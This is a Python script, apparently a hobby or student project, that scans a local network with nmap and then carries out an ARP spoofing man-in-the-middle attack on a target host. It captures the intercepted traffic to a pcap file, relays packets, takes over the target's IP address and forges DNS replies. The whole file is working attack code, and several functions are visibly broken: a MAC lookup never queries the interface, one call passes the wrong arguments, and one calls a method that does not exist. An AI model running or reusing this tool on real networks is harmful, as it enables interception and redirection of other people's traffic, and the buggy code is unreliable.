#Import List
from curses import qiflush
import ipaddress
import multiprocessing
import os
import socket
from sqlite3 import Time
from threading import Thread
import threading
import scapy.all as scapy
import psutil
import nmap
import sys
import struct
import re
import subprocess
import admin

#collection of all the network related functions used by the program
class NetFunctions():
    #Saves traffic to a pcap file, takes file name and interface as arguments
    def NetCap(dest, interface):
        while 1:
            scapy.wrpcap(dest, scapy.sniff(iface=interface, count=10), append=True)

    #Gets the IP for the device
    def get_ip():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0)
        try:
            s.connect(('10.254.254.254', 1)) # makes a socket connection to an IP address, doesnt matter if connection goes through just logs IP address from sender
            IP = s.getsockname()[0]
        except Exception:
            IP = '127.0.0.1'
        finally:
            s.close()
        return IP

    #Gets Interface by checking all interfaces on a device and matching it to an IP address
    def get_interface_from_ip(ip_address):
        # Get all network interfaces
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                # Check for the address family (IPv4)
                if addr.family == socket.AF_INET:
                    # If the IP address matches, return the interface
                    if addr.address == ip_address:
                        return interface
        return None

    def get_mac_by_ip_windows(ip_address):
        try:
            # Run ipconfig /all and capture the output
            result = subprocess.run(['ipconfig', '/all'], stdout=subprocess.PIPE, text=True)
            output = result.stdout

            # Find the section that contains the IP address
            ip_section = None
            for section in re.split(r'\r?\n\r?\n', output):
                if ip_address in section:
                    ip_section = section
                    break

            if ip_section:
                # Find the MAC address in the same section
                mac_match = re.search(r'Physical Address[ .]*: ([\w-]+)', ip_section)
                if mac_match:
                    return mac_match.group(1).replace("-", ":").lower()

            return None
        except Exception as e:
            print(f"Error: {e}")
            return None

    def get_mac_by_ip_linux(ip_address):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Get the interface associated with the given IP address
            iface = None
            for i in range(10):  # Check up to 10 interfaces
                iface_name = f'eth{i}'
                try:
                    iface_ip = socket.inet_ntoa(
                        struct.pack('256s', bytes(iface_name[:15], 'utf-8'))
                    )
                    if iface_ip == ip_address:
                        iface = iface_name
                        break
                except OSError:
                    continue

            if not iface:
                return None

            # Use ioctl to get the MAC address
            mac_addr = struct.pack(
                '256s', bytes(iface[:15], 'utf-8')
            )[18:24]

            # Format MAC address
            mac_address = ':'.join('%02x' % b for b in mac_addr)
            return mac_address
        except Exception as e:
            print(f"Error: {e}")
            return None

    def get_mac_by_ip_SELF(ip_address):
        if (os.name == 'nt'):
            return NetFunctions.get_mac_by_ip_windows(ip_address)
        else:
            return NetFunctions.get_mac_by_ip_linux(ip_address)

    def get_mac_by_ip(target_address, ip_address):
        ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC address
        # Create an ARP request
        arp = scapy.ARP(pdst=target_address)

        # Combine the Ethernet and ARP packet
        packet = ether / arp

        # Send the packet and capture the response
        try:
            # srp sends and receives packets at layer 2
            result = scapy.srp(packet, timeout=2, verbose=False, iface=NetFunctions.get_interface_from_ip(ip_address))[0]
            # Parse the response to find the MAC address
            for sent, received in result:
                return received.hwsrc  # Return the MAC address

        except Exception as e:
            print(f"Error: {e}")

        return None
    
        return None  # Return None if no MAC address found
    def spoof(target_ip, spoof_ip, target_mac, spoof_mac): #sends ARP packet that tells all other devices on network that target and attacker ip addresses have swapped MAC addresses making communication across network impossible without help from attacking PC
        while 1:
            packet = scapy.ARP(op = 2, pdst = spoof_ip, hwdst = target_mac, psrc = target_ip, hwsrc = spoof_mac)

            scapy.send(packet, iface=NetFunctions.get_interface_from_ip(spoof_ip) , verbose = False) 

            packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = spoof_mac, psrc = spoof_ip, hwsrc = target_mac)

            scapy.send(packet, iface=NetFunctions.get_interface_from_ip(spoof_ip) , verbose = False)

    def restore(destination_ip, source_ip): #reverts damage done to ARP tables by sending a ARP packet to reset tables
        destination_mac = scapy.getmacbyip(destination_ip) 
        source_mac = scapy.getmacbyip(source_ip) 
        packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac) 
        scapy.send(packet, verbose = False) 

    def packet_callback(packet):
        arr = [2]
        # Check if the packet has an Ethernet layer (Layer 2)
        try:
            dst_mac = packet[scapy.Ether].dst  # Destination MAC address
            arr[0] = dst_mac
        except:
            arr[0] = "ff:ff:ff:ff:ff:ff"

        # Check if the packet has an IP layer (Layer 3)
        try:
            dst_ip = packet[scapy.IP].dst  # Destination IP address
            arr[1] = dst_ip
        except:
            arr[1] = None

        return arr

    def changeIPAddressLinux(interface, IP, Subnet):
        try:
            # Bring the interface down
            subprocess.run(["sudo", "sysctl", "-w", f"net.ipv6.conf.{interface}.accept_dad=0"], check=True)

            subprocess.run(["sudo", "ip", "link", "set", interface, "down"], check=True)

            # Set the new IP address
            subprocess.run(["sudo", "ip", "addr", "add", f"{IP}/{Subnet}", "dev", interface], check=True)

            # Bring the interface back up
            subprocess.run(["sudo", "ip", "link", "set", interface, "up"], check=True)
        except subprocess.CalledProcessError as e:
            print(f"Failed to change IP address: {e}")

    def changeIPAddressWindows(target, interface, IP, Subnet):
        try:
            NetFunctions.send_gratuitous_arp(target, NetFunctions.get_mac_by_ip_SELF(IP), "255.255.255.0")
           # Set the new IP address
            cmd_ip = [
                "netsh", "interface", "ip", "set", "address", f"'name={interface}'",
                "source=static", f"addr={IP}", f"mask={Subnet}"
            ]
            test = subprocess.run(cmd_ip, check=True, capture_output=True)
            print(test)
        except subprocess.CalledProcessError as e:
            print(f"Failed to change IP address: {e}")

    def changeIPAddress(interface, IP, Subnet): #changes IP address and determines what OS to run seperate functions
        if (os.name == 'nt'):
            return NetFunctions.changeIPAddressWindows(interface, IP, Subnet)
        else:
            return NetFunctions.changeIPAddressLinux(interface, IP, Subnet)

    def send_gratuitous_arp(target_ip: str, MAC: str, interface: str):
        # Construct the ARP request
        arp_packet = scapy.ARP(psrc=target_ip, pdst=target_ip, hwsrc=MAC, hwdst="ff:ff:ff:ff:ff:ff", op=2)
    
        # Broadcast Ethernet frame
        ether_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    
        # Combine Ethernet and ARP
        packet = ether_packet / arp_packet

        # Send the packet
        scapy.sendp(packet, iface=interface)

    def send_dns_response(client_ip, client_port, domain, ip_address, transaction_id, Interface):
        # Google’s IP address for the response
        URL_Destination = "142.250.217.68"  # Replace with any IP you want to use, like Google's

        # Craft the IP layer
        ip = scapy.IP(src="8.8.8.8", dst=client_ip)  # Adjust source IP if needed
    
        # Craft the UDP layer
        udp = scapy.UDP(sport=53, dport=client_port)
    
        # Craft the DNS response layer
        dns = scapy.DNS(
            id=transaction_id,
            qr=1,        # Set to 1 for response
            opcode=0,
            aa=1,        # Authoritative answer
            tc=0,
            rd=0,
            ra=0,
            z=0,
            rcode=0,
            qdcount=1,
            ancount=1,
            qd=scapy.DNSQR(qname="anydomain.com"),  # Placeholder, ignored in response
            an=scapy.DNSRR(rrname="anydomain.com", ttl=3600, rdata=URL_Destination)
        )
    
        # Stack layers to form the final packet
        response_packet = ip / udp / dns
    
        # Send the packet
        scapy.send(response_packet, iface=Interface , verbose = False)

    def dns_request_handler(packet, ip_address, Interface):
        # Check if packet has DNS layer and is a query
        if packet.haslayer(scapy.DNS) and packet[scapy.DNS].qr == 0:
            client_ip = packet[scapy.IP].src
            client_port = packet[scapy.UDP].sport
            domain = packet[scapy.DNSQR].qname.decode("utf-8")  # Decode bytes to string
            transaction_id = packet[scapy.DNS].id
        
            # Define the IP address to respond with
            ip_address = "8.8.8.8"  # Replace with desired IP
        
            # Call function to send DNS response
            # NetFunctions.send_dns_response(client_ip, client_port, domain, ip_address, transaction_id, Interface)
            NetFunctions.send_dns_response(client_ip, client_port, domain, ip_address, transaction_id, Interface)

    def start_sniffing(ip_address, Interface):
        NetFunctions.sniff(filter="udp port 53", 
              prn=lambda packet: NetFunctions.dns_request_handler(packet, ip_address, Interface),
              iface="eth0")


def Main():
    #IP = NetFunctions.get_ip()

    #ARGV implementation for final revision
    #if sys.argv.len() <= 1:
    #    print("invalid IP Address")
    #    sys.exit()

    IP = '192.168.0.100' #predifined variable values for testing purposes
    Mac = NetFunctions.get_mac_by_ip_SELF(IP)
    MASK = "255.255.255.0"
    Target = "192.168.0.1"
    TargetMac = NetFunctions.get_mac_by_ip(Target, IP)
    Interface = NetFunctions.get_interface_from_ip(IP)

    # if len(IP.split()) != 4:
    #     print("IP Address invalid, check format")
    #     sys.exit()

    # for num in IP.split():
    #     if (num > 255 or num <= -1 or not (num.int)):
    #         print("IP Address invalid, check format")
    #         sys.exit()

    if not Interface:
        print("Interface invalid, check IP Address")
        sys.exit()

    host = ipaddress.IPv4Address(IP)
    net = ipaddress.IPv4Network(IP + '/' + MASK, False)
    gw = scapy.conf.route.route("0.0.0.0")[2]

    #starts new thread to run the function that gathers the Network traffic
    # t1 = threading.Thread(target=NetFunctions.NetCap, args=("test.pcap", NetFunctions.get_interface_from_ip(IP)))
    # t1.start()

    try:
       print("Starting Network Host Scan")
       nm = nmap.PortScanner()
       nm.scan(str(net.network_address) + "/24", '1')
       print(nm.all_hosts())
    except KeyboardInterrupt:
       sys.exit()
    except Exception as e: 
       print(f"Network scan failed: {e}")

    print(f"Starting ARP attack against: {Target}")

    IfIPChange=False

    if Target in nm.all_hosts():
        t2 = multiprocessing.Process(target=NetFunctions.spoof, args=(Target, IP, TargetMac, Mac))
        t2.start()

        if(IfIPChange==False):
            try:
                t2.terminate()
                NetFunctions.changeIPAddress(Interface, Target, MASK)
                IfIPChange=True

                print("IP Address successfully Changed")

                t1 = threading.Thread(target=NetFunctions.NetCap, args=("test.pcap", NetFunctions.get_interface_from_ip(IP)))
                t1.start()

                t2 = multiprocessing.Process(target=NetFunctions.spoof, args=(Target, IP, TargetMac, Mac))
                t2.start()

            except:
                IfIPChange=False

        while 1:
            try:
                packetCapturedGroup = scapy.sniff(iface=NetFunctions.get_interface_from_ip(IP), count=5) #Captures Packets

                for packetCaptured in packetCapturedGroup:
                    if packetCaptured: #Checks packets for IP destination and source so that the attacker can send data to original source after manipulating data
                        NetFunctions.start_sniffing("8.8.8.8", Interface)

                        if (NetFunctions.packet_callback(packetCaptured) == [Mac, Target]): #checks if destination is target
                            packet = packetCaptured.copy()

                            packet.pdst = Target
                            packet.dst = TargetMac

                            scapy.send(packet, iface=NetFunctions.get_interface_from_ip(IP) , verbose = False)
                        if (NetFunctions.packet_callback(packetCaptured) == [TargetMac, IP]): #checks if destination is host
                            packet = packetCaptured.copy()

                            packet.pdst = IP
                            packet.dst = Mac

                            scapy.send(packet, iface=NetFunctions.get_interface_from_ip(IP) , verbose = False) 

            except KeyboardInterrupt: #closes on keyboard interupt
                NetFunctions.restore(Target, IP)
                NetFunctions.changeIPAddress(Interface, IP, MASK)
                t2.join()
                t1.join()
                sys.exit()
            except Exception as e: #closes on exception
                print(f"Arp spoofing failed: {e}")
                NetFunctions.restore(Target, IP)
                NetFunctions.changeIPAddress(Interface, IP, MASK)
                t2.join()
                t1.join()
                sys.exit()

if __name__ == "__main__": #runs main program and checks for admin privileges
    if not admin.isUserAdmin():
        admin.runAsAdmin()
        print("Requesting Admin privileges")

    if admin.isUserAdmin():
        print("Successfully elevated")
        Main()